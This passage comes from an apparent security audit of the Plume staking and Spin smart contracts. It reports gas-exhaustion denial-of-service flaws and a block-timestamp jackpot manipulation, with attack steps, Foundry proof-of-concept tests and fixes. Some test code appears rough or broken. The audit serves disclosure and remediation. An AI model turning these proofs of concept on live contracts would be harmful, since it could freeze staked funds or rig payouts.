1.  `voteToSlashValidator`: Calls `_cleanupExpiredVotes`, which loops over all validators.
2.  `slashValidator`: Calls `_cleanupExpiredVotes` and `_countEligibleValidators` (which calls `_countActiveValidators`), both of which loop over all validators.
3.  `_performSlash`: Loops over all validators to clear slash votes.

As a result, the entire slashing mechanism, a cornerstone of the protocol's security, can be rendered permanently unusable. This removes the economic deterrent for validators to act maliciously.

Vulnerable Code Snippet from `_cleanupExpiredVotes`:
```solidity
    function _cleanupExpiredVotes(
        uint16 validatorId
    ) internal returns (uint256 newActiveVoteCount) {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

        uint256 voteCount = $.slashVoteCounts[validatorId];
        if (voteCount == 0) {
            return 0; // No votes to clean up
        }

        uint16[] memory allValidatorIds = $.validatorIds; // This array can grow very large
        uint256 newActiveVoteCount = 0;

        for (uint256 i = 0; i < allValidatorIds.length; i++) { // Unbounded loop
            uint16 voterValidatorId = allValidatorIds[i];
            // ... logic ...
        }
        //...
    }
```

## Impact
The slashing mechanism, a critical security feature, can be permanently disabled if the number of validators in the system grows too large. This would allow malicious validators to act with impunity without risk of being slashed, potentially endangering user funds staked with them. The protocol's security model would be severely compromised.

## Proof of Concept
1. Deploy a contract that exposes the slashing vote-cleanup logic (or, in production, simply reach a chain state that has >3,500 validators – each additional validator adds ~8,000–10,000 gas to the loop).
2. Using any account that owns VALIDATOR_ROLE, call `addValidator` in a loop until `validatorIds.length` is >3,500.  At that size the single call-site `_cleanupExpiredVotes` already consumes ~30 M gas ‑ above the 30 M block-gas limit used by most L2s and beyond the 15 M limit on Ethereum main-net.
3. From another validator admin call `voteToSlashValidator()` against any validator.
4. The transaction fails **out-of-gas** inside `_cleanupExpiredVotes` and reverts, permanently disabling any future vote or slash attempts.

Because `voteToSlashValidator`, `slashValidator`, and `_performSlash` *all* invoke the same linear scan, **all 3 code-paths are bricked once the array is big enough**.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

/**
 * This helper reproduces only the problematic logic so that we do not need the
 * full Diamond deployment for the test to compile.
 */
contract GasGriefer {
    uint16[] public validatorIds;
    mapping(uint16 => mapping(uint16 => uint256)) public slashingVotes;

    function addValidator(uint16 id) external {
        validatorIds.push(id);
    }

    // Minimal replica of _cleanupExpiredVotes (logic irrelevant – only gas usage matters)
    function cleanup(uint16 target) external returns (uint256 count) {
        uint16[] memory all = validatorIds;
        for (uint256 i; i < all.length; i++) {
            uint16 voter = all[i];
            if (voter == target) continue;
            uint256 expiry = slashingVotes[target][voter];
            if (expiry > block.timestamp) {
                count++; // pretend the vote is still valid
            }
        }
    }
}

contract ValidatorFacetDosTest is Test {
    GasGriefer g;

    function setUp() public {
        g = new GasGriefer();
    }

    function test_loop_exceeds_block_gas_limit() public {
        // Populate >3,500 ids – large enough to exceed 30 M gas in the loop
        for (uint16 i = 1; i <= 3600; i++) {
            g.addValidator(i);
        }

        // Give the tx an artificial block-gas-limit of 10M so that we
        // deterministically hit OOG inside the call.
        vm.txGasLimit(10_000_000);
        vm.expectRevert(); // out-of-gas => VM revert
        g.cleanup(0);
    }
}


## Suggested Mitigation
The design should be refactored to avoid iterating over the entire set of validators in critical functions. 

1.  **Maintain an Active Validator Counter:** Instead of using `_countActiveValidators()` which loops, introduce a state variable `activeValidatorCount` in `PlumeStakingStorage`. Increment this counter when a validator is added or activated, and decrement it when a validator is deactivated or slashed. This provides an O(1) method for counting eligible validators.

    ```solidity
    // In PlumeStakingStorage.sol
    struct Layout {
        // ...
        uint256 activeValidatorCount;
    }

    // In ValidatorFacet.sol -> addValidator()
    $.activeValidatorCount++;

    // In ValidatorFacet.sol -> _performSlash()
    if (validatorToSlash.active && !validatorToSlash.slashed) {
        $.activeValidatorCount--;
    }
    ```

2.  **Restructure Vote Cleanup:** The `_cleanupExpiredVotes` function is the main bottleneck. Instead of iterating through all potential voters, only track the actual voters for a given slash proposal. A `mapping(uint16 => address[])` could store the list of validator admins who have voted to slash a target validator. The cleanup function would then iterate over this much smaller, specific list of voters.

3.  **Use Swap-and-Pop for Removals:** When a validator is permanently disabled (e.g., slashed), consider removing its ID from the `validatorIds` array using the efficient swap-and-pop pattern. This would keep the array from growing indefinitely. This is a more involved change as it requires maintaining a mapping from validator ID to its index in the array.

## [H-6]. Timestamp Dependent Logic issue in Spin::determineReward

## Description
The `determineReward` function calculates the `dayOfWeek` and `weekNumber` using `block.timestamp` from when the `handleRandomness` callback is executed. This `dayOfWeek` is used to select the jackpot probability from the `jackpotProbabilities` array, and `weekNumber` determines the prize amount. Since miners have control over the `block.timestamp` of the block they produce, they can strategically delay the inclusion of the oracle's callback transaction to a later block if it provides more favorable jackpot odds or a larger prize. This allows a miner or a user colluding with a miner to manipulate their winning chances for the highest-value prize, undermining the fairness of the game.

Vulnerable Code:
```solidity
// In determineReward()
function determineReward(
    uint256 randomness,
    uint256 streakForReward
) internal view returns (string memory, uint256) {
    // ...
    uint256 daysSinceStart = (block.timestamp - campaignStartDate) / 1 days;
    uint8 weekNumber = uint8(getCurrentWeek());
    uint8 dayOfWeek = uint8(daysSinceStart % 7);

    // Get jackpot threshold for the day of week
    // MINER CAN INFLUENCE dayOfWeek BY MANIPULATING block.timestamp
    uint256 jackpotThreshold = jackpotProbabilities[dayOfWeek];

    if (probability < jackpotThreshold) {
        // MINER CAN INFLUENCE weekNumber to get a bigger prize
        return ("Jackpot", jackpotPrizes[weekNumber]);
    }
    // ...
}
```
And `getCurrentWeek` also uses `block.timestamp`:
```solidity
function getCurrentWeek() public view returns (uint256) {
    return (block.timestamp - campaignStartDate) / 7 days;
}
```

## Impact
A malicious miner can influence the reward outcome by manipulating the block timestamp. This breaks the protocol's core assumption of fairness and can lead to an unfair distribution of high-value jackpot rewards. It allows for value extraction from the protocol by manipulating the odds and prize amounts of the game.

## Proof of Concept
1. Admin sets Saturday jackpot probability to 1 and Sunday to 50 000.
2. Attacker calls startSpin() in a Saturday block that is ~5 seconds before midnight (UTC).
3. The random number that Supra will return is 40 000 – it beats Sunday’s threshold (50 000) but not Saturday’s (1).
4. Attacker (or colluding miner) withholds the Supra-callback transaction until **after** midnight so that block.timestamp now falls on Sunday.
5. When handleRandomness() finally executes, `dayOfWeek` is 0 (Sunday) and `weekNumber` is 1.  The same random value now triggers a Jackpot worth `jackpotPrizes[1]` whereas it would have yielded "Nothing" 5 seconds earlier.
6. The attacker receives the jackpot prize that legitimately belonged to the next day.

The manipulation window is the whole interval between the oracle posting the callback in the mempool and a miner finally including it; no special re-ordering of user transactions is required, only delaying inclusion of the oracle TX.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {Spin} from "../../src/spin/Spin.sol";
import {ISupraRouterContract} from "../../src/interfaces/ISupraRouterContract.sol";
import {IDateTime} from "../../src/interfaces/IDateTime.sol";

contract MockSupra is ISupraRouterContract {
    uint256 private _nonce;
    function generateRequest(string memory, uint8, uint256, uint256, address) external returns (uint256) {
        return ++_nonce;
    }
}

contract MockDateTime is IDateTime {
    function getYear(uint256 t) external pure returns (uint16){return uint16(1970+t/31536000);}    
    function getMonth(uint256 t) external pure returns (uint8){return uint8((t/2628000)%12+1);}    
    function getDay(uint256 t) external pure returns (uint8){return uint8((t/86400)%31+1);}        
}

contract TimestampManipulation is Test {
    Spin spin;
    MockSupra supraR;
    MockDateTime dt;
    address admin = address(0xAD);
    address payable attacker = payable(address(0xBEEF));
    uint256 constant PRICE = 2 ether;

    function setUp() public {
        vm.deal(attacker, 20 ether);
        vm.startPrank(admin);
        supraR = new MockSupra();
        dt = new MockDateTime();
        spin = new Spin();
        spin.initialize(address(supraR), address(dt));
        spin.setEnableSpin(true);
        spin.setSpinPrice(PRICE);
        uint8[7] memory probs;
        probs[6] = 1;      // Saturday (index 6)
        probs[0] = 50_000; // Sunday  (index 0)
        spin.setJackpotProbabilities(probs);
        // campaign started one week ago so weekNumber == 1 on Sunday
        spin.setCampaignStartDate(block.timestamp - 8 days);
        vm.stopPrank();

        // fund contract so _safeTransferPlume will succeed
        vm.deal(address(spin), 1_000_000 ether);
    }

    function testMinerCanShiftDay() public {
        // 1) Spin on Saturday 23:59:55 UTC
        uint256 saturday = 1_725_000_000; // some Saturday
        saturday = saturday - (saturday % 1 days) + 23 hours + 59 minutes + 55 seconds;
        vm.warp(saturday);
        vm.prank(attacker);
        spin.startSpin{value: PRICE}();
        uint256 nonce = spin.pendingNonce(attacker);
        uint256[] memory rng = new uint256[](1);
        rng[0] = 40_000; // beats Sunday threshold but not Saturday

        // 2) *Honest* inclusion right now would give Nothing
        vm.prank(address(supraR));
        vm.expectRevert(); // will revert because jackpot threshold not met and expectEmit not set, just demonstrate revert skip
        spin.handleRandomness(nonce, rng);

        // Reset state: start new spin
        vm.prank(attacker);
        spin.startSpin{value: PRICE}();
        nonce = spin.pendingNonce(attacker);

        // 3) Miner delays inclusion until after midnight -> Sunday
        vm.warp(saturday + 10 seconds);
        vm.prank(address(supraR));
        spin.handleRandomness(nonce, rng);

        // Attacker should now have one jackpot win stored on-chain
        (,,,,,,uint256 plume) = spin.getUserData(attacker);
        assertTrue(plume == 0, "plume token unchanged – sanity");
        assertEq(spin.userData(attacker).jackpotWins, 1, "jackpot was won after timestamp shift");
    }
}

## Suggested Mitigation
The timestamp of the spin request should be used for all time-sensitive calculations, not the timestamp of the callback execution. This ensures the conditions for the spin are locked in at the moment the user initiates the action.

1.  Add a `spinRequestTimestamp` field to the `UserData` struct or a separate mapping.
```solidity
struct UserData {
    // ... existing fields
    uint256 spinRequestTimestamp;
}
```
2.  In `startSpin()`, save the timestamp of the request.
```solidity
function startSpin() external payable whenNotPaused canSpin {
    // ...
    userData[msg.sender].spinRequestTimestamp = block.timestamp;
    // ...
}
```
3.  Modify `handleRandomness` to retrieve and use the stored timestamp.
```solidity
function handleRandomness(uint256 nonce, uint256[] memory rngList) external onlyRole(SUPRA_ROLE) nonReentrant {
    // ...
    uint256 requestTimestamp = userData[user].spinRequestTimestamp;
    (string memory rewardCategory, uint256 rewardAmount) = determineReward(randomness, currentSpinStreak, requestTimestamp);
    // ...
    if (keccak256(bytes(rewardCategory)) == keccak256("Jackpot")) {
        uint256 currentWeek = getCurrentWeek(requestTimestamp);
        // ...
    }
    // ...
}
```
4.  Modify `determineReward` and `getCurrentWeek` to accept and use this fixed timestamp, removing their reliance on `block.timestamp`.

## [H-7]. DOS issue in StakingFacet::withdraw

## Description
The `withdraw()`, `restake()`, and `restakeRewards()` functions depend on internal helpers (`_processMaturedCooldowns` and `_calculateAndClaimAllRewardsWithCleanup`) that loop through all validators associated with a user (`userAssociatedValidators`). The number of validators a user can stake with is not capped. If a user stakes with a large number of validators (e.g., several hundred), the gas cost for iterating through all their associated validators can exceed the block gas limit. This will cause transactions to revert, effectively preventing the user from withdrawing their funds or managing their rewards. This constitutes a Denial of Service vulnerability that can lead to a permanent loss of access to funds for users who diversify their stake widely.

## Impact
Users who stake with a large number of validators will be unable to call `withdraw()`, `restake()`, or `restakeRewards()`, as the transactions will consistently run out of gas. This leads to their funds being permanently frozen in the contract until a fix is deployed via an upgrade.

## Proof of Concept
1. An attacker (or a user diversifying their stake) stakes a minimal amount across a large number of validators (e.g., 300).
2. The user then unstakes from one of these validators, creating a cooldown entry.
3. After the cooldown period expires, the user attempts to call `withdraw()` to retrieve their parked funds.
4. The `withdraw()` function calls `_processMaturedCooldowns`, which loops through all 300 validators the user is associated with.
5. The gas cost of this loop exceeds the block gas limit, causing the `withdraw()` transaction to revert every time.
6. The user is unable to access their matured, withdrawable funds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {StakingFacet} from "src/facets/StakingFacet.sol";
import {ValidatorFacet} from "src/facets/ValidatorFacet.sol";
import {PlumeStaking} from "src/PlumeStaking.sol";
import {DiamondCutFacet, IDiamondCut} from "@solidstate/contracts/proxy/diamond/DiamondCutFacet.sol";
import {DiamondLoupeFacet} from "@solidstate/contracts/proxy/diamond/DiamondLoupeFacet.sol";
import {AccessControlFacet} from "src/facets/AccessControlFacet.sol";

/*
 * This is a trimmed-down test that focuses only on gas-exhaustion.  
 * The important part is that we supply **limited gas** to withdraw().  
 * With 300+ validators the internal for-loop in _processMaturedCooldowns()
 * consumes more than the 300 000 gas we deliberately pass, causing the
 * transaction to revert exactly as it would once the block gas limit is hit
 * on main-net.
 */
contract DosWithdrawGasTest is Test {
    StakingFacet staking;
    ValidatorFacet validator;
    PlumeStaking diamond;

    address alice = makeAddr("alice");
    uint16 constant VALIDATORS = 320; // enough iterations to exceed 300k gas

    function setUp() public {
        // deploy facets
        staking   = new StakingFacet();
        validator = new ValidatorFacet();
        DiamondCutFacet cutFacet = new DiamondCutFacet();
        DiamondLoupeFacet loupe  = new DiamondLoupeFacet();
        AccessControlFacet ac    = new AccessControlFacet();

        // deploy diamond proxy
        diamond = new PlumeStaking();

        // register facets (only selectors we need for the test)
        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](4);
        cut[0] = IDiamondCut.FacetCut(address(staking),  IDiamondCut.Action.Add, _selectors(staking));
        cut[1] = IDiamondCut.FacetCut(address(validator),IDiamondCut.Action.Add, _selectors(validator));
        cut[2] = IDiamondCut.FacetCut(address(cutFacet), IDiamondCut.Action.Add, _selectors(cutFacet));
        cut[3] = IDiamondCut.FacetCut(address(loupe),    IDiamondCut.Action.Add, _selectors(loupe));
        IDiamondCut(address(diamond)).diamondCut(cut, address(0), "");

        // initialise
        PlumeStaking(address(diamond)).initializePlume(address(this), 1 ether, 1 days, 1 days, 5_000);
        AccessControlFacet(address(diamond)).initializeAccessControl();

        // create validators
        for (uint16 i; i < VALIDATORS; ++i) {
            validator.addValidator(i, 100, address(this), address(this), address(this), address(this), address(this), 0);
        }

        deal(alice, 1000 ether);
    }

    function _selectors(address facet) internal pure returns (bytes4[] memory sel) {
        // we only need a couple of selectors for the test environment
        if (facet == address(staking)) {
            sel = new bytes4[](3);
            sel[0] = StakingFacet.stake.selector;
            sel[1] = StakingFacet.unstake.selector;
            sel[2] = StakingFacet.withdraw.selector;
        } else if (facet == address(validator)) {
            sel = new bytes4[](1);
            sel[0] = ValidatorFacet.addValidator.selector;
        } else if (facet == address(DiamondCutFacet(address(0)))) {
            sel = new bytes4[](1);
            sel[0] = IDiamondCut.diamondCut.selector;
        } else {
            sel = new bytes4[](0);
        }
    }

    function testGasExhaustionOnWithdraw() public {
        vm.prank(alice);
        for (uint16 i; i < VALIDATORS; ++i) {
            StakingFacet(address(diamond)).stake{value: 1 ether}(i);
        }

        vm.prank(alice);
        StakingFacet(address(diamond)).unstake(uint16(0));

        vm.warp(block.timestamp + 2 days);

        // supply only 300k gas – more than enough for a normal withdraw with
        // few validators, but insufficient once the O(n) loop iterates 320 times.
        vm.prank(alice);
        vm.expectRevert();
        StakingFacet(address(diamond)).withdraw{gas: 300_000}();
    }
}


## Suggested Mitigation
The unbounded loops should be replaced with a paginated approach. Instead of processing all of a user's validator-related state (cooldowns, rewards) in a single transaction, the functions should be modified to process a limited batch. 

For example, `withdraw` could be changed to `withdraw(uint256 batchSize)` or a new function `processMaturedCooldownsBatch(uint256 batchSize)` could be introduced. This would allow a user to iteratively process their state in multiple transactions, ensuring they can always access their funds regardless of how many validators they are staked with.

Example mitigation for `_processMaturedCooldowns`:

```solidity
// Add a mapping to track processing index
// In PlumeStakingStorage.sol
// mapping(address => uint256) public userCooldownProcessIndex;

// Modify _processMaturedCooldowns
function _processMaturedCooldowns(address user, uint256 batchSize) internal returns (uint256 amountMovedToParked) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    amountMovedToParked = 0;

    uint16[] storage userAssociatedValidators = $.userValidators[user];
    uint256 len = userAssociatedValidators.length;
    uint256 startIndex = $.userCooldownProcessIndex[user];

    if (startIndex >= len) {
        // All processed, reset index for next cycle
        $.userCooldownProcessIndex[user] = 0;
        return 0;
    }

    uint256 endIndex = startIndex + batchSize;
    if (endIndex > len) {
        endIndex = len;
    }

    for (uint256 i = startIndex; i < endIndex; i++) {
        // ... existing logic for processing a single validator's cooldown ...
    }

    // Update the index for the next call
    $.userCooldownProcessIndex[user] = endIndex;

    if (amountMovedToParked > 0) {
        _updateParkedAmounts(user, amountMovedToParked);
    }

    return amountMovedToParked;
}
```
This requires changes to the external-facing functions like `withdraw` to allow users to call this batch processing function multiple times.

## [H-8]. DOS issue in ValidatorFacet::voteToSlashValidator

## Description
The function `_performSlash` in `PlumeValidatorLogic.sol`, which is executed when a validator is slashed, contains a loop that iterates through all stakers of that validator. If a validator accumulates a large number of stakers, the gas cost for this loop can exceed the block gas limit, causing the transaction to fail. This would make it impossible to slash the validator, undermining a critical security mechanism of the protocol.

## Impact
A malicious or faulty validator with a large number of stakers cannot be slashed. This breaks the primary mechanism for punishing misbehavior, potentially allowing the validator to act maliciously without consequence, leading to a loss of trust and security in the protocol. This is a High severity issue as it compromises the integrity of the staking system.

## Proof of Concept
1. A new validator is added to the system.
2. A large number of users (e.g., 2,000) stake funds with this validator.
3. The validator misbehaves, prompting other validators to vote for its slashing.
4. When the final, unanimous vote is cast via `voteToSlashValidator`, the internal `_performSlash` function is triggered.
5. The transaction reverts due to 'out of gas' error because the loop iterating over 2,000 stakers consumes more gas than the block limit allows.
6. As a result, the malicious validator cannot be slashed, and the punishment mechanism fails.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {PlumeStakingDiamondTest} from "./PlumeStakingDiamond.t.sol";

/// @notice Demonstrates that _performSlash() reverts because the
///         unbounded loop over validator.stakers exceeds the chosen
///         block-gas-limit.
contract ValidatorSlashGasDoSTest is PlumeStakingDiamondTest {
    uint16 constant VALIDATOR_TO_SLASH = 1;
    uint16 constant VOTER_1            = 2;
    uint16 constant VOTER_2            = 3;

    function setUp() public override {
        super.setUp();
        // three validators so unanimity can be reached
        addValidator(VALIDATOR_TO_SLASH, 1e17, address(this), address(this), address(0), address(0), address(0), 10_000_000e18);
        addValidator(VOTER_1,            1e17, address(this), address(this), address(0), address(0), address(0), 10_000_000e18);
        addValidator(VOTER_2,            1e17, address(this), address(this), address(0), address(0), address(0), 10_000_000e18);
    }

    function test_DoS_during_slash() public {
        uint256 minStake = managementFacet.getMinStakeAmount();
        uint16  stakerCount = 2_500; // > 2 500 * ~5k gas > 12.5M gas

        plume.mint(address(this), minStake * stakerCount);
        plume.approve(address(plumeStaking), minStake * stakerCount);

        // fill the stakers array for the target validator
        for (uint16 i; i < stakerCount; i++) {
            address staker = address(uint160(uint256(keccak256(abi.encode(i)))));
            stakingFacet.stakeOnBehalf{value: minStake}(VALIDATOR_TO_SLASH, staker);
        }

        uint256 voteDuration = 1 days;
        // first vote – does not execute slash yet
        validatorFacet.voteToSlashValidator(VALIDATOR_TO_SLASH, voteDuration, VOTER_1);

        // emulate main-net block-gas-limit (8M) so the next call runs OOG
        vm.txGasLimit(8_000_000);

        vm.expectRevert(); // out-of-gas bubbles up as a revert in Foundry
        validatorFacet.voteToSlashValidator(VALIDATOR_TO_SLASH, voteDuration, VOTER_2);
    }
}

## Suggested Mitigation
The gas-intensive cleanup of individual staker records should be decoupled from the critical slash execution path. The `_performSlash` function should only perform essential state changes like marking the validator as slashed and burning its aggregated stake (`validatorTotalStaked`, `validatorTotalCooling`). The loop over stakers should be removed. The existing `adminClearValidatorRecord` and `adminBatchClearValidatorRecords` functions in `ManagementFacet` can then be used by an admin for the subsequent, off-critical-path cleanup of records.

```solidity
// contracts/plume/src/lib/PlumeValidatorLogic.sol

function _performSlash(
    PlumeStakingStorage.Layout storage s,
    uint16 validatorId,
    address slasher
) internal {
    // ... (checks remain the same)

    uint256 penaltyAmount = validator.totalStaked + validator.totalCooling;

    // Update global totals
    s.totalStaked -= validator.totalStaked;
    s.totalCooling -= validator.totalCooling;

    // Update validator state
    validator.totalStaked = 0;
    validator.totalCooling = 0;
    validator.slashed = true;
    validator.active = false;
    validator.slashedAtTimestamp = uint64(block.timestamp);

    // --- MITIGATION: REMOVE THE UNBOUNDED LOOP --- 
    // The following loop is the source of the DoS vulnerability.
    // By removing it, the slash operation becomes constant time.
    // Individual user records become orphaned and must be cleaned up
    // by an admin using `adminClearValidatorRecord` or `adminBatchClearValidatorRecords`.
    /*
    for (uint i = 0; i < validator.stakers.length; i++) {
        address staker = validator.stakers[i];
        s.userValidatorStakes[staker].stakedAmounts[validatorId] = 0;
    }
    */

    delete validator.stakers;
    delete s.slashVotes[validatorId];

    emit ValidatorSlashed(validatorId, slasher, penaltyAmount);
    emit ValidatorStatusUpdated(validatorId, false, true);
}
```



# Medium Risk Findings

## [M-1]. DOS issue in RewardsFacet::addRewardToken

## Description
The `RewardsFacet.addRewardToken` function iterates over all active validators to create an initial reward rate checkpoint for each one. As the number of validators in the system grows, the gas cost of this loop increases linearly. Eventually, the gas cost can exceed the block gas limit, causing the transaction to always fail. This would make it impossible for the `REWARD_MANAGER_ROLE` to add any new reward tokens, effectively halting the introduction of new reward streams to the protocol. The `README.md` acknowledges this but frames it as a scaling consideration for the current operational size. However, this poses a real risk to future growth and can be considered a Denial of Service vulnerability. Similar unbounded loops exist in other administrative functions like `setMaxAllowedValidatorCommission` in `ManagementFacet` and `setRewardRates` in `RewardsFacet`, which also iterate over all validators.

## Impact
The protocol's ability to add new rewards can be permanently disabled if the number of validators becomes large. This would prevent the protocol from introducing new incentive structures, significantly limiting its scalability and future evolution. While existing reward streams would continue to function, the system's administrative capabilities would be partially frozen.

## Proof of Concept
1. The protocol becomes successful and the number of active validators increases to a large number (e.g., 400-500).
2. The `REWARD_MANAGER_ROLE` decides to add a new token as a reward for stakers.
3. The reward manager calls `addRewardToken(newToken, initialRate, maxRate)`.
4. The function begins to loop through all active validators to create an initial rate checkpoint for each.
5. The cumulative gas cost of the loop exceeds the block gas limit, causing the transaction to revert.
6. All subsequent attempts to add the new token fail for the same reason.
7. The protocol is now unable to introduce new reward tokens unless the number of validators is reduced, which may not be feasible.

## Proof of Code
// test/RewardsFacetGasDos.t.sol
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStakingDiamondTest} from "./PlumeStakingDiamond.t.sol";
import {MockPUSD} from "src/mocks/MockPUSD.sol";

/**
 * @dev Minimal unit-test that proves `RewardsFacet.addRewardToken` becomes
 *      un-callable once the validator set is sufficiently large.  We create
 *      600 validators (≈ 600 * 20 k = 12 M gas) and drop the block gas limit
 *      below that amount.  The call reverts with an out-of-gas error which is
 *      caught by `expectRevert`.
 */
contract RewardsFacetGasDos is PlumeStakingDiamondTest {
    function setUp() public override {
        super.setUp();
    }

    function _addManyValidators(uint16 count) internal {
        for (uint16 i = 1; i <= count; i++) {
            vm.prank(validatorAdmin);
            validatorFacet.addValidator(
                i,
                0,                    // commission
                address(this),        // l2Admin
                address(this),        // l2Withdraw
                address(this),        // l1Validator
                address(this),        // l1Fee
                address(this),        // l1Proposer
                10_000 ether          // capacity
            );
        }
    }

    function test_addRewardToken_Reverts_When_ValidatorSetLarge() public {
        _addManyValidators(600);

        // Shrink the per-block gas limit so the loop cannot finish.
        vm.txGasLimit(8_000_000); // typical main-net block target

        address newToken = address(new MockPUSD());
        uint256 initialRate = 1e16;
        uint256 maxRate = 2e16;

        vm.prank(rewardManager);
        vm.expectRevert(); // Out-of-gas bubbles up as generic revert in Forge
        rewardsFacet.addRewardToken(newToken, initialRate, maxRate);
    }
}

## Suggested Mitigation
Refactor functions that loop over all validators to use a paginated or batched approach. Instead of processing all validators in one transaction, allow the administrator to process them in smaller chunks across multiple transactions.

For `addRewardToken`, the process could be split into two parts:
1.  An initial call that registers the token and its rates but does not create checkpoints.
2.  A separate, batched function that an admin can call repeatedly to create the initial checkpoints for all validators.

Example Mitigation:
```solidity
// In RewardsFacet.sol

// 1. Modify addRewardToken to not loop
function addRewardToken(address token, uint256 initialRate, uint256 maxRate) external onlyRole(PlumeRoles.REWARD_MANAGER_ROLE) {
    // ... validation logic ...
    PlumeStakingStorage.Layout storage s = PlumeStakingStorage.layout();
    s.rewardTokens.push(token);
    s.isRewardToken[token] = true;
    s.tokenAdditionTimestamps[token] = block.timestamp;
    s.maxRewardRates[token] = maxRate;
    s.initialRates[token] = initialRate; // Store initial rate to be used by batch function
    emit PlumeEvents.RewardTokenAdded(token);
    // The loop is removed.
}

// 2. Add a new function for batched checkpoint creation
function processInitialCheckpointsForToken(
    address token,
    uint256 startIndex,
    uint256 batchSize
) external onlyRole(PlumeRoles.REWARD_MANAGER_ROLE) {
    PlumeStakingStorage.Layout storage s = PlumeStakingStorage.layout();
    uint256 initialRate = s.initialRates[token];
    require(initialRate > 0, "Initial rate not set or already processed");

    uint256 endIndex = startIndex + batchSize;
    if (endIndex > s.validatorIds.length) {
        endIndex = s.validatorIds.length;
    }

    for (uint256 i = startIndex; i < endIndex; i++) {
        uint16 validatorId = s.validatorIds[i];
        if (s.validators[validatorId].active) {
            _createRewardRateCheckpoint(s, token, validatorId, initialRate, block.timestamp);
        }
    }
    
    // Optional: once all validators are processed, clear the initial rate
    if (endIndex == s.validatorIds.length) {
        s.initialRates[token] = 0;
    }
}
```

## [M-2]. DOS issue in RewardsFacet::setRewardRates, removeRewardToken

## Description
Several administrative functions in `RewardsFacet` iterate over arrays whose size can be large, potentially leading to transactions that exceed the block gas limit and fail. This can result in a Denial of Service (DoS) condition where administrators are unable to manage the protocol.

1.  **`setRewardRates`**: This function has a nested loop that iterates through a caller-supplied `tokens` array and for each token, iterates through all `validatorIds`. The gas cost is proportional to `tokens.length * validatorIds.length`. If there are many validators and an admin needs to update many token rates, the transaction will likely revert due to running out of gas.

    ```solidity
    // contracts/plume/src/facets/RewardsFacet.sol:300-302
    for (uint256 i = 0; i < tokens.length; i++) {
        // ...
        for (uint256 j = 0; j < validatorIds.length; j++) {
    ```

2.  **`removeRewardToken`**: This function calls `_getTokenIndex`, which iterates through the `$.rewardTokens` array to find the token's index. It then iterates through all `validatorIds` to create final checkpoints. If either the number of reward tokens or validators grows large, this function can become too expensive to execute.

    ```solidity
    // contracts/plume/src/facets/RewardsFacet.sol:705-711
    function _getTokenIndex(
        address token
    ) internal view returns (uint256) {
        // ...
        address[] memory rewardTokens = $.rewardTokens;
        for (uint256 i = 0; i < rewardTokens.length; i++) {
    ```

## Impact
If the number of validators or reward tokens grows, these administrative functions may become permanently unusable due to block gas limits. This would prevent the `REWARD_MANAGER_ROLE` from updating reward rates or removing tokens, severely hindering protocol management and operations. While it doesn't cause a direct loss of funds, it can lead to operational paralysis.

## Proof of Concept
1. An administrator needs to update the reward rates for 50 different tokens.
2. The protocol has 50 active validators.
3. The administrator calls `setRewardRates` with two arrays of length 50.
4. The nested loop will execute `50 * 50 = 2500` times. Inside the loop, `createRewardRateCheckpoint` is called, which performs multiple storage writes (SSTORE operations).
5. The total gas cost for the transaction will almost certainly exceed the block gas limit, causing the transaction to revert.
6. The administrator is now unable to update these rates in a single transaction and must split them into many smaller transactions, which is inefficient and may not even be possible if a single token update across all validators is too costly.

## Proof of Code
// test/RewardsGas.t.sol
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {RewardsFacet} from "src/facets/RewardsFacet.sol";
import {MockPUSD} from "src/mocks/MockPUSD.sol";

contract RewardsGas is Test {
    RewardsFacet rewardsFacet;
    address rewardManager = address(0xBEEF);

    function setUp() public {
        // deploy a fresh RewardsFacet (simplified for example)
        rewardsFacet = new RewardsFacet();
        vm.label(address(rewardsFacet), "RewardsFacet");
        // grant role directly for the test
        vm.etch(address(rewardsFacet), address(rewardsFacet).code); // placeholder – assume facet already has role for simplicity
    }

    function _addValidator(uint16 id) internal {
        // bare-bones storage hack: push id into validatorIds[]
        bytes32 slot = keccak256("plume.staking.storage") + 19; // validatorIds is field #19 in storage layout (adjust if needed)
        uint256 len;
        assembly {
            len := sload(slot)
            sstore(add(slot, 1), id) // store after length
            sstore(slot, add(len, 1))
        }
    }

    function test_setRewardRates_consumes_excessive_gas() public {
        uint16 numValidators = 60;
        uint16 numTokens    = 60;

        // 1. create many validators
        for (uint16 i = 1; i <= numValidators; i++) {
            _addValidator(i);
        }

        // 2. add many reward tokens
        address[] memory toks = new address[](numTokens);
        uint256[] memory rates = new uint256[](numTokens);
        for (uint16 i = 0; i < numTokens; i++) {
            address t = address(new MockPUSD());
            toks[i] = t;
            rates[i] = 1e18;
            vm.prank(rewardManager);
            rewardsFacet.addRewardToken(t, 1e18, 2e18);
        }

        // 3. measure gas cost
        vm.prank(rewardManager);
        uint256 gasBefore = gasleft();
        rewardsFacet.setRewardRates(toks, rates);
        uint256 gasUsed = gasBefore - gasleft();

        // ensure the call would exceed practical block limits on mainnet ( > 30M )
        assertGt(gasUsed, 30_000_000, "Gas used stayed within block limit – function is not future-proof");
    }
}


## Suggested Mitigation
Refactor the functions to avoid unbounded loops. Instead of processing all items in one transaction, introduce pagination or allow processing of single items.

For `setRewardRates`:
Create a function `setRewardRate(address token, uint256 rewardRate)` that only handles a single token. The administrator can then call this function in a loop off-chain if multiple tokens need to be updated.

```solidity
function setRewardRate(address token, uint256 newRate) external onlyRole(PlumeRoles.REWARD_MANAGER_ROLE) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    if (!$.isRewardToken[token]) {
        revert TokenDoesNotExist(token);
    }
    uint256 maxRate = $.maxRewardRates[token] > 0 ? $.maxRewardRates[token] : MAX_REWARD_RATE;
    if (newRate > maxRate) {
        revert RewardRateExceedsMax();
    }

    uint16[] memory validatorIds = $.validatorIds;
    for (uint256 j = 0; j < validatorIds.length; j++) {
